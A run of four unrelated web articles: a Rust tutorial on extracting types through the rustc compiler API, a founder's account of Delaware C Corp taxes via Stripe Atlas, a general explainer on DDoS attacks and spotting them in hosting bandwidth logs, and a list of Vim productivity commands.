<p>However, at the same time, <em>compilers are able to infer more than ever about their programs through static analysis.</em> With that comes a tradeoff—requiring the programmer to write down less information about their program (while still being type/memory-safe) makes the programmer more productive. However, <em>in plain text</em>, this makes it more difficult for others to read the same program, as understanding types and lifetimes often help us understand what a piece of code is doing. This is why IDEs are actually taking the charge in cracking open the compiler black box. The folks at Microsoft created both the <a href="https://langserver.org/">Language Server Protocol</a> for standardizing a common interface for program navigation/editing, and they’ve also been hard at work on <a href="https://github.com/dotnet/roslyn/wiki/Roslyn%20Overview">Roslyn</a>, a new API for opening up the C# compiler.</p>

<p><em>The benefits of extracting knowledge out of the compiler extend well beyond IDEs.</em> As more compiler APIs emerge, statically typed languages can begin to approach dynamically typed languages in their flexibility and extensibility, but without the overhead. It will become easier to use the introspective tools of today (debugging complex data structures, automatic serializer generation) as well as enable the language extensions of tomorrow (<a href="https://www.cs.cmu.edu/~aldrich/papers/ecoop14-tsls.pdf">type-directed macro parsing</a>, <a href="http://terralang.org/">embedded high-performance DSLs</a>). So let’s figure out how much we can already do with our current compilers!</p>

<h2 id="using-the-rustc-api">Using the rustc API</h2>

<p>Of the moderately popular statically typed languages that I know of, Rust has one of the nicest compilers, <code>rustc</code>, in terms of its <a href="https://rust-lang-nursery.github.io/rustc-guide">documentation</a> and ease of integration. Since rustc is written in Rust, it’s easy to call out to Rust compiler functions in Rust code. Subsequently, in the remainder of this note, we will look at how to use the Rust compiler to do type-directed metaprogramming of Rust code.</p>

<p>Before diving into details, a word of caution: the Rust compiler API is not stable at all, and changes frequently. The specific code in this note will likely be somewhat out of date in a few weeks or months. Running the code requires using the nightly builds. If you are a Rust metaprogramming compiler-hacking fanatic like me, then the specifics will help you understand how to actually use the compiler’s API. Otherwise, you can treat this as an example of what type-directed metaprogramming could look like in a brighter future where these APIs are stable. All of the code below is available in my repository <a href="https://github.com/willcrichton/rustc-type-metaprogramming">rustc-type-metaprogramming</a>. Let’s get to it!</p>

<p>On a high level, our first goal is just to call the Rust compiler and extract the types of a few fragments of Rust code. The Rust compiler API can be found in their <a href="https://github.com/rust-lang/rust/tree/8aa27ee30972f16320ae4a8887c8f54616fff819/src">GitHub repo</a> with <a href="https://rust-lang-nursery.github.io/rustc-guide/">high-level documentation</a>. To start, we need to create a new crate and put it on nightly:</p>
<div><div><pre><code>$ cargo new --bin rustc-type-metaprogramming
$ cd rustc-type-metaprogramming
$ rustup override set nightly-2018-03-19
</code></pre></div></div>

<p>Then we fill out the <code>src/main.rs</code> file:</p>

<div><div><pre><code><span>#![feature(rustc_private,</span> <span>quote)]</span>
<span>fn</span> <span>main</span><span>()</span> <span>{}</span>
</code></pre></div></div>

<p>We use Rust’s feature gates to explicitly declare that we intend to use the private API to rustc as well as the quotation API in <a href="https://github.com/rust-lang/rust/tree/8aa27ee30972f16320ae4a8887c8f54616fff819/src/libsyntax"><code>libsyntax</code></a> (more on that later). At this point, we can look to the rustc driver (<a href="https://github.com/rust-lang/rust/tree/8aa27ee30972f16320ae4a8887c8f54616fff819/src/librustc_driver"><code>librustc_driver</code></a>) to see how the Rust compiler calls its own functions from the top-level (i.e. when the user calls <code>rustc</code> on the command line). Specifically, the <a href="https://github.com/rust-lang/rust/blob/8aa27ee30972f16320ae4a8887c8f54616fff819/src/librustc_driver/lib.rs#L445"><code>run_compiler</code></a> and <a href="https://github.com/rust-lang/rust/blob/8aa27ee30972f16320ae4a8887c8f54616fff819/src/librustc_driver/driver.rs#L67"><code>compile_input</code></a> functions show the 10,000 feet view of the compiler stages. A plain English explanation of this is also provided in the <a href="https://rust-lang-nursery.github.io/rustc-guide/high-level-overview.html">documentation</a>.</p>

<p>We need to do a lot of stuff that’s required by the compiler but largely irrelevant for our task (like provide command line options, create code maps for a non-existent source file, set up a bunch of compiler infrastructure). In the code snippets, I omit the uninteresting boilerplate/lifetimes/etc. with <code>...</code>, but you can find the full working example in the repository. Let’s say we want to type-check the function <code>fn main() { let x = 1 + 2; }</code>. Our metaprogramming function then looks like:</p>

<div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>...</span>

    <span>let</span> <span>krate</span> <span>=</span> <span>{</span>
        <span>...</span>
        <span>ast</span><span>::</span><span>Crate</span> <span>{</span>
            <span>...</span>
            <span>quote_item!</span><span>(</span><span>fn</span> <span>main</span><span>()</span> <span>{</span> <span>let</span> <span>x</span> <span>=</span> <span>1</span> <span>+</span> <span>2</span><span>;</span> <span>})</span>
        <span>}</span>
    <span>};</span>

    <span>let</span> <span>hir</span> <span>=</span> <span>driver</span><span>::</span><span>phase_2_configure_and_expand</span><span>(</span><span>krate</span><span>,</span> <span>...</span><span>);</span>
    <span>...</span>

    <span>ty</span><span>::</span><span>TyCtxt</span><span>::</span><span>create_and_enter</span><span>(</span><span>hir</span><span>,</span> <span>...</span><span>,</span> <span>|</span><span>tcx</span><span>|</span> <span>{</span>
        <span>typeck</span><span>::</span><span>check_create</span><span>(</span><span>tcx</span><span>)</span><span>.unwrap</span><span>();</span>
        <span>println!</span><span>(</span><span>"Type checked successfully!"</span><span>);</span>
    <span>});</span>
<span>}</span>
</code></pre></div></div>

<p>This consists of three steps: first, we need to produce a syntactic representation of the program. One way to do this is to represent the program as a string and then run the rustc parser, e.g.</p>

<div><div><pre><code><span>let</span> <span>prog</span><span>:</span> <span>&amp;</span><span>str</span> <span>=</span> <span>"fn main() { let x = 1 + 2; }"</span><span>;</span>
<span>let</span> <span>parser</span> <span>=</span> <span>Parser</span><span>::</span><span>new</span><span>();</span> <span>// not actually this easy IRL</span>
<span>let</span> <span>func</span><span>:</span> <span>ast</span><span>::</span><span>Item</span> <span>=</span> <span>parser</span><span>.parse</span><span>(</span><span>prog</span><span>)</span><span>.unwrap</span><span>();</span>
</code></pre></div></div>

<p>However, a nicer way to do this is to use quotations, or macros that essentially do the parsing for us. Quotations like <code>quote_item!</code> take as input Rust code and return the programmatic representation of that code as a Rust syntax tree (AST), which we use above. We then wrap the function in a crate, since that’s the input the Rust compiler expects.</p>

<p>Second, we convert the AST into the high-level intermediate representation (HIR), described <a href="https://rust-lang-nursery.github.io/rustc-guide/hir.html">here</a>. HIR has fewer syntactic forms that the AST the programmer uses, e.g. <code>for</code> loops are converted into <code>loop</code> loops. Lastly, we run the typechecker by creating a type context <code>tcx</code> and run it with <code>TyCtxt::check_crate</code>. If our code snippet typechecks like it does in our example, then this code will execute and print the success message. You can verify this with:</p>

<div><div><pre><code>$ cargo run
Type checked successfully!
</code></pre></div></div>



<p>Now that we can run the compiler, we next want to extract the types it computes. Let’s say we want to print out the type of every expression in our sample program. One way to do this would be to manually traverse the syntax tree with recursive <code>match</code> statements, but that’s onerous and not easily extensible when the AST changes. Instead, we can use the visitor pattern where we only define behavior for the parts of the syntax tree we care about, and use default implementations for the rest.</p>

<p>Luckily, this is a common pattern in the Rust compiler so they have already implemented much of this machinery for us! Specifically, <code>librustc::hir::intravisit</code> provides a <a href="https://github.com/rust-lang/rust/blob/8aa27ee30972f16320ae4a8887c8f54616fff819/src/librustc/hir/intravisit.rs#L149">Visitor trait</a> that we can implement to walk through a HIR tree.</p>

<div><div><pre><code><span>struct</span> <span>TestVisitor</span> <span>{</span>
    <span>tcx</span><span>:</span> <span>ty</span><span>::</span><span>TyCtxt</span>
<span>}</span>

<span>impl</span> <span>Visitor</span> <span>for</span> <span>TestVisitor</span> <span>{</span>
    <span>...</span>

    <span>fn</span> <span>visit_expr</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>expr</span><span>:</span> <span>&amp;</span><span>hir</span><span>::</span><span>Expr</span><span>)</span> <span>{</span>
        <span>let</span> <span>ty</span> <span>=</span> <span>self</span><span>.tcx</span><span>.type_of</span><span>(</span><span>expr</span><span>);</span> <span>// not actually this easy IRL</span>
        <span>println!</span><span>(</span><span>"Node: {:?}, type: {:?}"</span><span>,</span> <span>expr</span><span>,</span> <span>ty</span><span>);</span>
        <span>intravisit</span><span>::</span><span>walk_expr</span><span>(</span><span>self</span><span>,</span> <span>expr</span><span>);</span>
    <span>}</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>...</span>

    <span>ty</span><span>::</span><span>TyCtxt</span><span>::</span><span>create_and_enter</span><span>(</span><span>hir</span><span>,</span> <span>...</span><span>,</span> <span>|</span><span>tcx</span><span>|</span> <span>{</span>
        <span>typeck</span><span>::</span><span>check_crate</span><span>(</span><span>tcx</span><span>)</span><span>.unwrap</span><span>();</span>
        <span>let</span> <span>mut</span> <span>visitor</span> <span>=</span> <span>TestVisitor</span> <span>{</span> <span>tcx</span><span>:</span> <span>tcx</span> <span>};</span>
        <span>tcx</span><span>.hir</span><span>.visit</span><span>(</span><span>&amp;</span><span>mut</span> <span>visitor</span><span>);</span>
    <span>});</span>
<span>}</span>

</code></pre></div></div>

<p>Running this code, we get the following output:</p>
<div><div><pre><code>$ cargo run
Node: expr(13: { let x = 1 + 2; }), type: ()
Node: expr(11: 1 + 2), type: i32
Node: expr(9: 1), type: i32
Node: expr(10: 2), type: i32
</code></pre></div></div>

<p>Awesome! We were able to access every expression and its type, even though no types were ever written down explicitly. The code works by creating a visitor <code>TestVisitor</code> that contains the type context <code>tcx</code> that tells us the types of expressions when we ask it with <code>type_of</code>. The visitor walks through the HIR tree, and when it finds an expression like <code>1+2</code>, it calls the function which prints both the expression and its type. Then we …</p></div></div>

      <section>
        <p><em>Disclaimer: this blog post doesn’t constitute accounting advice. When in doubt, talk to a lawyer/accountant and all that jazz.</em></p>

<h2 id="background">Background</h2>

<p>I incorporated a C Corp in the State of Delaware via Stripe Atlas in February 2019. It was my first time dealing with the tax system in the US, as I’ve never been or operated a business there.</p>

<p>Taxes must be one of the scariest aspects precluding folks from going into a business. Below is an account of how I <del>struggled</del> dealt with my first tax season.</p>

<p>All usual disclaimers apply.</p>

<h2 id="why-a-c-corp-instead-of-an-llc">Why a C-Corp instead of an LLC?</h2>

<p>A single-member LLC (regarded as a pass-through entity by default) complicates tax situation for nonresident aliens - a term-of-art for non-US citizens &amp; residents (which is me).</p>

<p>While C Corps are more complex to run, their tax treatment is relatively straightforward: they’re only taxed on their profits. If you’re paying yourself a salary, you can expense that amount, which will lower your taxable income (assuming you’re not a US taxpayer. Otherwise, it gets complicated, fast).</p>

<p>If you’re a US citizen or a resident, LLC is more apt if you want to bootstrap your business.</p>

<p>At the time of writing, Stripe has restricted LLCs to US founders only. Presumably, some folks have shot themselves in feet too much that they decided to pull the plug.</p>

<h2 id="registered-agent">Registered agent</h2>

<p>Companies formed in the State of Delaware are required to keep a registered agent in the state. Think of it as an address state and federal agencies use to get ahold of you.</p>

<p>Somewhere around mid-January, you will receive an email from Stripe Atlas asking whether you want to renew the registered agent. If you don’t explicitly opt-out, they will automatically renew your registered agent subscription by the end of January.</p>

<p>Unfortunately, the registered agent that comes with Atlas can’t accept general mail (except for bank cards). Some virtual address providers (aka <abbr title="Commercial mail receiving agency">CMRA</abbr>) can act as your registered agent. That way, you can avoid the $100 fee for the default registered agent that comes with Atlas. To change the registered agent, you will have to complete a “Change of Address” form.</p>

<h2 id="delaware-franchise-tax">Delaware Franchise Tax</h2>

<p>While Delaware doesn’t have a sales tax, they do impose a <em>Franchise Tax</em> on registered businesses.</p>

<p>There are two ways to calculate the Franchise Tax: Authorized Shares Method and Assumed Par Value Capital Method. I won’t get into a <a href="https://corp.delaware.gov/frtaxcalc/">nitty-gritty</a>, but suffice it to say that you can use one that minimizes your tax liability.</p>

<p>A lot of folks running C Corps get stupendously high tax estimates amounting to tens or hundreds of thousands of dollars (causing a drama on the Stripe Atlas forum every time). It happens because the State of Delaware uses an Authorized Shares Method that results in higher tax bills. Once you switch to the Assumed Par Value Capital Method, your tax liability will (probably) drop to $450.</p>

<p>You don’t need an accountant to file an annual report, although the user interface is horrendous, to put it mildly.</p>

<p>One thing that I wish I’d known is that you can save on the Franchise Tax by authorizing 5000 shares (or less) instead of 10,000,000 shares, which is the Atlas’ default. That way, your tax due will be $225 ($175 minimum tax + $50 annual report filing fee) instead of $450. LLCs in Delaware pay a flat $300 tax.</p>

<h2 id="corporate-income-taxes">Corporate income taxes</h2>

<p>You pay corporate income taxes on the profit you make during the tax year. Even if you didn’t earn a single cent from the business, you still have to file a tax report by April 15th (you can ask the <abbr title="Internal Revenue Service">IRS</abbr> to extend the deadline).</p>

<p>Nothing precludes you from filing tax reports yourself. Unless you know what you’re doing, you will probably screw it up (terribly) and waste a lot of time that you otherwise can spend on running your business (tax reporting shouldn’t be <em>that</em> complex, but that’s a topic for another day). Stripe Atlas has partnered with two accounting firms offering tax preparation services at a discount.</p>

<p>Your accountant will ask you some questions and your balance sheet and an income (P&amp;L) statement for the previous financial year, so you will have to take care of the bookkeeping before talking to the accountant.</p>

<p>Because I’m a foreigner owning more than 25% of a US corporation, I have to file Form 5472 as well (in addition to Form 1120). The inaccurate filling or failure to file it usually carries a $25,000 fine. In that light, it’s better to pay an accountant and not worry about it.</p>

<p>Make sure you have an <abbr title="Electronic Federal Tax Payment System">EFTPS</abbr> pin code before the tax season. However, judging by the number of discussions on the Stripe Atlas forum, a lot of folks outside the US don’t receive that mail. To add an insult to the injury, they don’t give you the pin code over the phone. If you’re outside of the US, get yourself a mailing address in the US, and ask the IRS to mail you the EFTPS pin code.</p>

<h2 id="just-give-me-the-numbers">Just give me the numbers</h2>

<table>
  <thead>
    <tr>
      <th>Item</th>
      <th>Cost</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Registered agent</td>
      <td>$100</td>
    </tr>
    <tr>
      <td>Delaware Franchise Tax (C Corp)</td>
      <td>$450</td>
    </tr>
    <tr>
      <td>Accounting service (discounted)</td>
      <td>$250</td>
    </tr>
  </tbody>
</table>

<p>So with the default Stripe Atlas setup for C Corps, you’re looking at $800 for yearly maintenance at a minimum (without corporate income taxes). If you opt to use a default bank account provided by Atlas (SVB), add $300 on top of that ($25 x 12), unless you maintain an average balance of $25,000 per month.</p>

<p>If you plan to incorporate towards the end of the year, wait until January. That way, you can <em>skip</em> one tax year and spend time building a business instead of doing a soul-sucking administrative busywork.</p>

<p>Today, a DDoS attack has become a common phenomenon and a severe headache to internet resource owners worldwide. Therefore, it is important to use a reliable method of protection from this type of cyber-attack for those who want to avoid downtime, massive losses, and damaged reputation.</p>



<p><em>Find out more about </em><a href="https://utopia.fans/security/protected-internet-stay-save-online/"><em>Protected Internet</em></a><em>. Follow simple rules and stay save online.</em></p>



<p>Today, we’ll talk in depth about DDoS attacks and try to answer how to trace a DDoS attack yourself.</p>



<p><a href="https://utopia.fans/privacy/5-reasons-why-online-privacy-matters/"><em>5 Reasons Why Online Privacy Matters</em></a><em>. Stay in touch with all the cyber threats on the net.</em></p>



<h3>The issue of a DDoS attack</h3>



<p><a href="https://www.softwaretestinghelp.com/ddos-attack/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">DDoS or distributed denial of service</a> is a malicious attack on an information system. It is aimed at stopping the system from processing user requests. Such an attack suppresses a web resource or server by using multiple sources to overwhelm the system and make the server unavailable for normal requests. If you think that this type of attack is most often used against large companies and government agencies, you are mistaken. DDoS attacks can occur equally with an ordinary user, as well as with the management of a large company.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Privacy-Matters.jpg.webp" alt="What is a DDoS attack" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Privacy-Matters.jpg.webp 1024w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Privacy-Matters-300x172.jpg.webp 300w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Privacy-Matters-768x441.jpg.webp 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>This type of attack is similar to another Internet threat – Denial of Service (DoS). The main difference is that in the case of DoS the attack comes from a single source, while DDoS attacks are triggered by multiple sources at once, making them much harder to protect against.</p>



<p>The main goal of denial of service attacks is to block the operation of a particular site. In addition, DDoS attacks can serve as a distraction from another, more significant cyber-attack.</p>



<h3>The main reasons for DDoS attacks</h3>



<ul><li><strong>Personal dislike.</strong> Simple animosity often prompts attackers to attack corporations or government agencies. For example, in 1999, the FBI’s websites were attacked for several weeks. It happened because the FBI had begun a large-scale raids on known and suspected hackers.</li></ul>



<ul><li><strong>Political protest.</strong> Usually, such attacks are carried out by hacktivists – IT specialists with radical views on civil protest. A well-known example is a series of cyberattacks on Estonian government institutions in 2007. Their probable cause was the deep controversy at the time over the relocation of the Monument to the Liberators of Tallinn.</li></ul>



<ul><li><strong>Entertainment.</strong> Today, an increasing number of people are interested in DDoS and want to try their hand at it. Novice hackers often stage attacks to amuse themselves.</li></ul>



<ul><li><strong>Extortion and blackmail. </strong>Before launching an attack, the hacker contacts the resource owner and demands a ransom.</li></ul>



<ul><li><strong>Competition.</strong> DDoS attacks can be ordered by an unethical company to negatively impact one or more of its competitors.</li></ul>



<h3>Who are the potential victims?</h3>



<p>DDoS can destroy sites of any scale, from ordinary blogs to major corporations, banks, and other government institutions.</p>



<p>According to research, the attacks can cost the company up to $1.6 million. This is serious damage because the attacked web resource can’t be used for some time.</p>



<p>Most often, these types of sites and servers suffer from DDoS attacks:</p>



<ul><li>large companies and government agencies</li><li>financial institutions (banks, management companies)</li><li>coupon services</li><li>medical institution</li><li>payment systems</li><li>media and information aggregators</li><li>online stores and e-commerce businesses</li><li>online games and gaming services</li><li>cryptocurrency exchanges</li></ul>



<p>Not so long ago, the sad list of frequent victims of DDoS attacks was joined by Internet-connected equipment, commonly called the “Internet of things” (IoT). The IoT is increasingly becoming both a victim and a source of such attacks. The largest growth dynamics in this direction are cyberattacks to disrupt the online sales systems of large stores or shopping centers.</p>



<h3>Work mechanism</h3>



<p>All web servers have their own limits on the number of requests they can process simultaneously. In addition, there is a limit on the bandwidth of the channel connecting the network and the server. To overwhelm these restrictions, malicious hackers create a computer network with malicious software, called a “botnet” or “zombie network.”</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Work-mechanism.png.webp" alt="Example of DDoS attack" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Work-mechanism.png.webp 467w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Work-mechanism-300x191.png.webp 300w" sizes="(max-width: 467px) 100vw, 467px"></figure></div>



<p>To create a botnet, cybercriminals distribute a “Trojan” virus via e-mail, social networks, or websites. Computers that are part of the botnet do not have a physical connection to each other. They are united only by “serving” the goals of the host hacker.</p>



<p>A hacker sends commands to the “infected” zombie computers during a DDoS attack, and they begin to attack. The botnet generates a huge amount of traffic that can overload any system. The main objects for DDoS are usually the server’s bandwidth, DNS server, and the internet connection itself.</p>



<h3>Signs of a DDoS attack</h3>



<p>When these malicious actions achieve their goal, you can immediately determine this by failures in the server or the hosted resource. But there are several indirect signs that you can detect about a DDoS attack at the very beginning.</p>



<ul><li>Server software and OS start to fail frequently and clearly — hang, incorrectly shut down, and so on.</li><li>A sharply increased load on the server’s hardware capacity, which differs from the average daily indicators.</li><li>A rapid increase in incoming traffic on one or more ports.</li><li>Multiple duplicated client actions of the same type on the same resource (going to the site, uploading a file).</li><li>When analyzing logs (of user actions) of the server, firewall, or network devices, many requests of the same type from different sources to the same port or service were detected. You should be especially wary if the audience for requests differs sharply from the target audience for the site or service.</li></ul>



<h3>Classification of DDoS attacks</h3>



<p>Protocol offensive (transport level)</p>



<p>A DDoS attack is directed at the network layer of a server or web resource, often referred to as a network layer or transport layer attack. Its purpose is to overload tablespace on a firewall with a built-in security log, a central network, or a load-balancing system.</p>



<p>The most common DDoS method at the transport level is network flooding, creating a huge stream of dummy requests at different levels that the receiving node cannot physically handle.</p>



<p>During an attack, the number of requests increases so much that the device does not have enough resources to complete the first request. As a result, the flood maximally saturates the bandwidth and completely clogs all communication channels.</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Protocol-offensive.jpg.webp" alt="Types of DDoS attacks" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Protocol-offensive.jpg.webp 1024w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Protocol-offensive-300x169.jpg.webp 300w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/Protocol-offensive-768x432.jpg.webp 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>Common types of network flooding:</p>



<ul><li>HTTP — A mass of normal or encrypted HTTP messages is sent to the attacked server, clogging communication nodes.</li><li>ICMP — The attacker’s botnet overloads the victim’s host machine with service requests, to which it is required to provide echo responses.</li><li>SYN — These attacks affect one of the basic mechanisms of the TCP Protocol, known as the “triple handshake” principle (the “request-response” algorithm: SYN packet – SYN-ACK packet – ACK packet).</li><li>UDP — Random ports of the victim’s host machine are flooded with UDP packets, the responses to which overload network resources. A type of UDP flood directed to the DNS server is called a “DNS flood.”</li><li>MAC — Targets are network hardware whose ports are clogged with streams of&nbsp;“empty” packets with different MAC addresses.</li></ul>



<p>Attacks at the application level</p>



<p>These include such a common attack as “Ping of Death” — mass sending of ICMP packets of greater length to the victim’s computer, causing buffer overflow.</p>



<ul><li>DNS attacks</li></ul>



<p>The first group focuses on vulnerabilities in DNS server. These include such common types of cybercrimes as “Zero-Day Attack” and “Fast Flow.”</p>



<p>One of the most common types of DNS attacks is called DNS spoofing. In this type of attack, hackers replace the IP address in the server cache, redirecting the user to a fake page. During the transition, the criminal gets access to the user’s personal data and can use it to their advantage.&nbsp;</p>



<p>For example, in 2009, because of DNS spoofing, users could not log in to Twitter for an hour. This attack was political. Iranian attackers redirected users to warnings related to American aggression.</p>



<p>The second type of DNS attack is the DDoS attacks that cause DNS servers to fail. If they fail, the user will not go to the desired page, because the browser will not find the IP address specific to the site.</p>

<h3>How to trace a DDoS attack?</h3>



<p>How do you know that your site has been attacked? There are <a href="https://www.darkreading.com/attacks-breaches/how-to-trace-a-ddos-attack/d/d-id/1129036" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">several signs</a> such as the error 503 of HTTP and the wrong usage of bandwidth.</p>



<p>To make sure if your site has been attacked, just log into your account and open Cpanel (a web hosting&nbsp;control&nbsp;panel). At the end of the page you’ll find the “Logs section,” where you should select “Bandwidth.”</p>



<div><figure><img loading="lazy" decoding="async" src="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/prevent-DDoS-attacks.jpg.webp" alt="The method of how to trace a DDoS attack" srcset="https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/prevent-DDoS-attacks.jpg.webp 1024w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/prevent-DDoS-attacks-300x169.jpg.webp 300w,  https://utopia.fans/wp-content/webp-express/webp-images/uploads/2020/08/prevent-DDoS-attacks-768x432.jpg.webp 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>The next image that you can see has two scenarios:</p>



<p>Without an attack. When an attack has not occurred, the bandwidth graph for the last day looks like a relatively constant line, with several peaks.</p>



<p>With an attack. If your site has been hit by a DDoS attack, you will see a sharp jump in the bandwidth graph. This anomaly will be observed for more than an hour.</p>



<p>If you detect a DDoS attack, you should not waste a minute and act very quickly, since attacks consume a lot of network bandwidth, and can harm other clients as well.</p>



<p><em>-How to stop a DDoS attack?</em></p>



<p>Unfortunately, it is quite difficult to stop a DDoS attack. The best method is to contact your web hosting provider. It will block all HTTP requests that have been sent to your web server. This action helps to unload and close the server and prevents attacks on other clients.</p>



<p>Such an attack requires large hacker resources and usually last no more than one hour. So, you need to wait for the end of attack. However, after the attack is complete, you will be able to fully return to work.</p>

			                    <h2>Introduction</h2>
<p>If you're like me, you often re-Google Vim commands on the fly at the moment you realize you need them. For productivity's sake, it is worth practicing a few useful commands to turn them into habit. In this article, we'll discuss 7 versatile Vim commands that are easy to understand, use, and commit to memory.</p>
<h2>1. The dot command</h2>
<p>The <strong>dot command</strong> is a simple and powerful tool in Vim. It allows <em>repeating the last change</em> by pressing the <code>.</code> (period) key in Normal mode. This command is so versatile because "the last change" can mean many, many things, such as:</p>
<ul>
<li>Deleting one or more characters, words, or lines in Normal mode using <code>x</code>, <code>dw</code>, <code>d$</code>, <code>dd</code> or variations thereof.</li>
<li>Changing text indentation level using commands like <code>&gt;&gt;</code>, <code>&lt;&lt;</code>, or variations thereof.</li>
<li>Adding text in insert mode (between pressing <code>i</code> to get into Insert mode and <code>ESC</code> to exit insert mode).</li>
</ul>
<p>In general, executing any command in Normal mode that changes the text in your active file (or <strong>buffer</strong> as it is called in Vim), can be replayed using the dot command.</p>
<p>When repeating changes made in Insert mode, the change will be repeated using <em>the same command that was used to enter Insert mode</em>. For example, if Insert mode was entered using the <code>i</code> command, the text will be placed <em>before the cursor</em> when repeated using the dot command. If Insert mode was entered using the <code>a</code> command, it will be placed <em>after the cursor</em> when repeated using the dot command. Similarly, text inserted using the <code>I</code> and <code>A</code> commands gets repeated at the beginning and end of the line by the dot command, respectively.</p>
<p>Since <strong>motions</strong> (commands that move the cursor around in Vim) don't change anything, they cannot be replayed using the dot command. <em>However</em>, like most commands in Vim, the dot command can be prefixed with a number which tells Vim to execute it that many times. For example typing <code>5.</code> will repeat the last change 5 times.</p>
<p><strong>Less memorizable BONUS</strong>: Type <code>@:</code> in Normal mode to repeat the last Command mode command (i.e. the kind where you type a colon which brings the cursor to the bottom of the screen to enter something like <code>:some-command</code>). This one isn't as easy to memorize, but hey, at least you know it exists now.</p>
<h2>2. Mark a location within a file</h2>
<p>Next, we'll discuss a convenient feature that allows us to mark the current location in a file so that we can easily jump back to it later in the editing session. This is especially useful in long code files in which we need to frequently jump back and forth to make edits.</p>
<p>Marks are set in Normal mode. We can set a mark on the exact, current location of the cursor by typing <code>m</code> ("m" for "mark"!) followed by any lowercase letter. Therefore, we have 26 possible marks we can set and use at one time within each file.</p>
<p>We can jump back to that exact location by, (in Normal mode), typing a back-tick <code>`</code> followed by the lowercase letter used to create the mark. To help this one sink in, remember that the "back"-tick takes you "back" to the mark specified after it.</p>
<p>For example, if we create a mark using the command <code>mb</code>, we can jump to that location at any time using the command <code>`b</code>.</p>
<p>Double-tapping the back-tick key <code>``</code> will jump back to the location before the last jump. This is nice if you jump to a mark accidentally and want to get back to where you were working.</p>
<p>One last cool aspect of marks is that they persist on a per-file basis when you exit Vim with or without saving the buffer.</p>
<h2>3. Word autocompletion</h2>
<p>Another easy productivity boost can be obtained via Vim's built-in autocompletion feature. We will discuss the simplest version of this feature, which allows you to partially type a word (like a variable or function name), and tell Vim to pop up a list of autocompletion suggestions for you to choose from.</p>
<p>Vim's autocompletion list is triggered directly from Insert mode, since autocompletion shouldn't interrupt the flow of our writing too much. In Insert mode, start typing a word and then press <code>&lt;CTRL-n&gt;</code>. This will display a little pop-up list containing a list of words that match the part of the word we typed so far:</p>
<p><img src="https://initialcommit.com/img/blog/7-versatile-vim-commands-1.png" alt="Vim autocompletion word list" title="Vim autocompletion word list">
</p>
<p>This word list is generated <em>only from existing words in the current file</em>, so it is great for autocompleting things like long variable and function names.</p>
<p>You can toggle down the list of words by pressing <code>&lt;CTRL-n&gt;</code> to highlight the desired word, and then simply keep typing to continue your sentence without delay.</p>
<p>Fun fact - you can use <code>&lt;CTRL-p&gt;</code> to toggle backward through the word list, but that's an extra thing to remember which defeats the purpose of this article, so pretend I never said anything.</p>
<p><strong>Less memorizable BONUS</strong>: Instead of sourcing word lists for autocompletion from the current file, we can source them from Vim's built-in dictionary. To do this, first enable Vim's spellchecker by running <code>:set spell</code>. You might see some text highlighting - ignore it. Now when you're ready to autocomplete a word in Insert mode, instead of typing <code>&lt;CTRL-n&gt;</code>, type <code>&lt;CTRL-x&gt;&lt;CTRL-k&gt;</code>. This will source the autocompletion list from Vim's dictionary and present you with many more options, which can be good on the off change you're trying to write a real word.</p>
<h2>4. Simple arithmetic</h2>
<p>This one will be short and sweet. If Vim's cursor is positioned on top of a number in an open file, we can press <code>&lt;CTRL-a&gt;</code> ("a" for "add"!) to increment that number by 1 and <code>&lt;CTRL-x&gt;</code> to decrement that number by 1.</p>
<p>Typing a number before either of these commands will run it multiple times. For example, typing <code>5&lt;CTRL-x&gt;</code> will subtract 5 from that number.</p>
<p>If the cursor is not positioned directly on top of a number, the <code>&lt;CTRL-a&gt;</code> and <code>&lt;CTRL-x&gt;</code> commands will jump forward to the next occurrence of a number in the file and increment or decrement it accordingly.</p>
<p>Flashback to (1): The dot command can be used to repeat these addition and subtraction operations.</p>
<h2>5. Jump to the command-line without exiting Vim</h2>
<p>We can run any command from the command-line without exiting Vim. From Normal mode we can type a colon to enter Command mode followed by an exclamation point, followed by our terminal command. From Normal mode, we would type something like <code>:!ls</code>. This would display the command-line (keeping our Vim buffer open in the background), and list the contents of the current directory. As soon as we press a key, we are returned to our Vim file so we can continue working where we left off. Any command-line operation can be executed in this way.</p>
<h2>6. Using the buffer list</h2>
<p>Although most of us probably work on one file at a time in Vim, we can boost productivity by learning to make use of Vim's multi-file capabilities.</p>
<p>Previously, we mentioned the term <strong>buffer</strong>. When we open a file with Vim, we aren't working directly on the file itself. Instead we're working on an in-memory representation of that file, called a buffer. Most commands operate directly on the buffer, which gets written back to the file when we save the buffer.</p>
<p>Vim allows us to open multiple buffers in the same session. Try opening two files at once like this <code>vim file1.ext file2.ext</code>.</p>
<p>Vim will create and open a buffer for the first file listed, but in the background, a buffer for the second file is also created. You can prove this to yourself by running the <code>:ls</code> command in Vim which will list the open buffers. You can open as many files as you want this way, specifying wildcards like <code>vim *.java</code> if your heart desires it.</p>
